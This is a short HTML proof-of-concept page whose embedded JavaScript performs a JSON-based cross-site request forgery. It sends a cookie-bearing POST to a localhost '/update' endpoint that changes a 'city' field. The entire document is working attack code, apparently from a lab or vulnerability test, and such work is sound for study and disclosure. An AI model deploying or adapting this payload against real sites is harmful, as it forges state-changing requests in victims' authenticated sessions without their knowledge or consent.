<html>
<!-- This PoC script sends a JSON-based CSRF request -->

<script type="text/javascript">
   // Vulnerable URL and JSON body
   var url = "https://127.0.0.1:5000/update";
   var data = JSON.stringify({ "city": "BOMFromCloud" });

   var CSRF = new XMLHttpRequest();
   CSRF.open("POST", url, true);
   CSRF.withCredentials = true; // Use the victim's session cookies

   // Set proper JSON header
   CSRF.setRequestHeader("Content-Type", "application/json");
   CSRF.send(data);
</script>

</html>
